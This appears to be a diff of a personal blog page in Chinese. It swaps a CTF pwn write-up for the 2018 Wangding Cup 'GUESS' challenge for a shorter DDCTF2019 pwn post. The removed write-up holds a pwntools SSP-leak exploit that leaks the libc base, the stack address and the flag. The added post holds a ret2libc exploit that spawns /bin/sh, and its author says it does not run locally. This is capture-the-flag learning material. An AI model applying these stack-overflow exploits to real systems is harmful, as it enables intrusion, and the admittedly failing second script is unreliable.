@@ -15,24 +15,17 @@
 
 
 
-<meta name="description" content="hint: libc基址泄露+flag泄露">
+<meta name="description" content="自己补一下栈">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2018网鼎杯pwn-GUESS">
-<meta property="og:url" content="http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/index.html">
+<meta property="og:title" content="DDCTF2019-pwn">
+<meta property="og:url" content="http://yoursite.com/2019/05/16/DDCTF2019-pwn/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="hint: libc基址泄露+flag泄露">
+<meta property="og:description" content="自己补一下栈">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg">
-<meta property="og:updated_time" content="2019-03-04T15:19:04.079Z">
+<meta property="og:updated_time" content="2019-05-16T16:01:38.002Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018网鼎杯pwn-GUESS">
-<meta name="twitter:description" content="hint: libc基址泄露+flag泄露">
-<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg">
+<meta name="twitter:title" content="DDCTF2019-pwn">
+<meta name="twitter:description" content="自己补一下栈">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>2018网鼎杯pwn-GUESS | 4eriri&#39;s blog</title>
+<title>DDCTF2019-pwn | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -196,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-2018网鼎杯pwn-GUESS" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-DDCTF2019-pwn" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/04/2018网鼎杯pwn-GUESS/" class="article-date">
-      <time datetime="2019-03-04T14:26:04.000Z" itemprop="datePublished">2019-03-04</time>
+      <a href="/2019/05/16/DDCTF2019-pwn/" class="article-date">
+      <time datetime="2019-05-16T14:30:32.000Z" itemprop="datePublished">2019-05-16</time>
 </a>
 
 
@@ -215,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      2018网鼎杯pwn-GUESS
+      DDCTF2019-pwn
     </h1>
   
 
@@ -232,43 +225,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>hint: libc基址泄露+flag泄露</p>
+        <p>自己补一下栈</p>
 <a id="more"></a>
-<p>开启了canary保护</p>
-<p>IDA观察一波：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r4u9gwo2j30rw0oitdk.jpg" alt=""></p>
-<p>发现输入flag的地方有栈溢出，并且运行了一下发现一共可以输入3次，同时因为有fork的操作，所以即使第一次输入触发了canary，之后仍然可以进行第二第三次输入。</p>
-<p>这里利用<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44069&amp;highlight=pwn" target="_blank" rel="noopener">SSP Leak</a>就可以泄漏libc基址和flag了。</p>
-<p>触发canary后，程序会以<code>%s</code>输出<code>__libc_main_argv[0]</code>，可以通过栈溢出覆盖到这个位置的，从而泄漏出想要泄漏的东西。</p>
-<p>使用gdb对程序进行调试，很方便就能得到该位置：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0r55df11yj30f801qt8x.jpg" alt=""></p>
-<p><code>__libc_main_argv[0]=0x7fffffffdde8</code></p>
-<p>在gets函数后下断点，对栈进行观察，找到输入在栈中的位置：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r56yrwzaj31200hswjb.jpg" alt=""></p>
-<p>这里我输入的是随便打的<code>tyuio</code></p>
-<p><code>input=0x7fffffffdcc0</code></p>
-<p>所以需要的填充为：<code>0x7fffffffdde8-0x7fffffffdcc0=296</code></p>
-<p>不知道libc版本的话，三次栈溢出貌似不太够用，所以我先泄漏了两个libc函数地址，手动找到了libc版本。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">start_got=elf.got[&quot;__libc_start_main&quot;]</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(puts_add)</span><br><span class="line">sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(start_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)start_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(start_add)</span><br></pre></td></tr></table></figure>
-<p>一开始接受地址的时候，recv了8个字节，结果出了问题，从上面的栈图中也可以发现，64位程序内存的地址貌似最多只有6个字节，因此接受6个字节，再加2个<code>\x00</code>就可以了。</p>
-<p>运行得到两个libc函数的地址：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0r5k5sxg6j30vm0t4aff.jpg" alt=""></p>
-<p>通过<a href="https://libc.blukat.me/?q=__libc_start_main%3A740%2Cputs%3A690&amp;l=libc6_2.23-0ubuntu10_amd64" target="_blank" rel="noopener">网站在线查询</a>可以得到libc版本（其实也可以用LibcSearcher这个库，但最近重装虚拟机还没弄好）：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5ooe7bpj31q00u0jxc.jpg" alt=""></p>
-<p>得到基址：<code>libc_base=puts_add-0x06f690</code></p>
-<p>为了泄漏flag，还要知道栈的地址。</p>
-<p>libc里有*environ指针指向栈地址，所以可以通过这个指针泄漏栈地址。</p>
-<p>在刚刚的网站可以查到_environ与libc基址之间的偏移。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br></pre></td></tr></table></figure>
-<p>得到了栈地址之后，只要知道flag在栈中的偏移，就可以泄漏flag。</p>
-<p>通过gdb查看栈地址：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0r5hhyg66j30ga01w74i.jpg" alt=""></p>
-<p>计算flag在栈中偏移：</p>
-<p><code>0x7fffffffddf8-0x7fffffffdc90=360</code></p>
-<p>最终exp：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./GUESS&quot;)elf=ELF(&quot;./GUESS&quot;)puts_got=elf.got[&quot;puts&quot;]sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(puts_got))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)puts_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)libc_base=puts_add-0x06f690environ_add=libc_base+0x3c6f38sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(environ_add))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)stack_add=u64(sh.recv(6)+&quot;\x00\x00&quot;)sh.recvuntil(&apos;Please type your guessing flag&apos;)sh.sendline(&quot;a&quot;*296+p64(stack_add-360))sh.recvuntil(&apos;*** stack smashing detected ***: &apos;)flag=sh.recvuntil(&quot;&#125;&quot;)print flag</span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~$ python guess.py[+] Starting local process &apos;./GUESS&apos;: pid 22240[*] &apos;/home/parallels/GUESS&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)[*] Process &apos;./GUESS&apos; stopped with exit code 0 (pid 22240)flag&#123;just4eriri&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./xpwn&quot;)libc=ELF(&quot;./libc.so.6&quot;)sh.recvuntil(&apos;Enter username: &apos;)sh.send(&apos;a&apos;*4*15)sh.recvuntil(&apos;a&apos;*4*15)setbuf=u32(sh.recv(4))sh.recv(8)ebp=u32(sh.recv(4))libcbase=setbuf-libc.symbols[&apos;setbuf&apos;]print hex(libcbase)sh.recvuntil(&apos;Please set the length of password: &apos;)sh.sendline(&apos;-1&apos;)sh.recvuntil(&apos;Enter password(lenth 4294967295): &apos;)sh.send(&apos;a&apos;*4*17+p32(ebp-8+0x20)+&apos;a&apos;*4*6+p32(libcbase+libc.symbols[&apos;system&apos;])+p32(0xdeadbeef)+p32(libcbase+libc.search(&apos;/bin/sh&apos;).next()))sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>当时没做出来，因为如果直接填充a会报错，中间有一部分是要自己补的，感觉和canary差不多，现在做的时候没远程环境了，本地打不下来，网上找了其他人写的脚本，也跑不了，不知道哪里出了问题。</p>
 
       
     </div>
@@ -277,13 +237,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/04/2018网鼎杯pwn-GUESS/">2018网鼎杯pwn-GUESS</a></p>
+        <p><span>本文标题:</span><a href="/2019/05/16/DDCTF2019-pwn/">DDCTF2019-pwn</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-03-04, 22:26:04</p>
-        <p><span>最后更新:</span>2019-03-04, 23:19:04</p>
+        <p><span>发布时间:</span>2019-05-16, 22:30:32</p>
+        <p><span>最后更新:</span>2019-05-17, 00:01:38</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/04/2018网鼎杯pwn-GUESS/" title="2018网鼎杯pwn-GUESS">http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/16/DDCTF2019-pwn/" title="DDCTF2019-pwn">http://yoursite.com/2019/05/16/DDCTF2019-pwn/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/16/DDCTF2019-pwn/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -295,16 +255,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/12/32位程序调用64位代码/">
-                    调用64位代码的32位程序逆向
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/24/安恒杯2019年2月月赛/">
-                    安恒杯2019年2月月赛
+                <a href="/2019/05/13/某awd的唯一pwn/">
+                    某awd的唯一pwn
                 </a>
             </div>
         
@@ -316,7 +270,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">1.</span> <span class="toc-text">EXP</span></a></li></ol>
         
     </div>
     <style>
@@ -352,7 +306,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"2018网鼎杯pwn-GUESS　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"DDCTF2019-pwn　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -371,8 +325,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/';
-            this.page.identifier = '2019/03/04/2018网鼎杯pwn-GUESS/';
+            this.page.url = 'http://yoursite.com/2019/05/16/DDCTF2019-pwn/';
+            this.page.identifier = '2019/05/16/DDCTF2019-pwn/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -394,15 +348,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/12/32位程序调用64位代码/" title="上一篇: 调用64位代码的32位程序逆向">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/24/安恒杯2019年2月月赛/" title="下一篇: 安恒杯2019年2月月赛">
+            <a href="/2019/05/13/某awd的唯一pwn/" title="下一篇: 某awd的唯一pwn">
                 <i class="fa fa-angle-right"></i>
             </a>
         
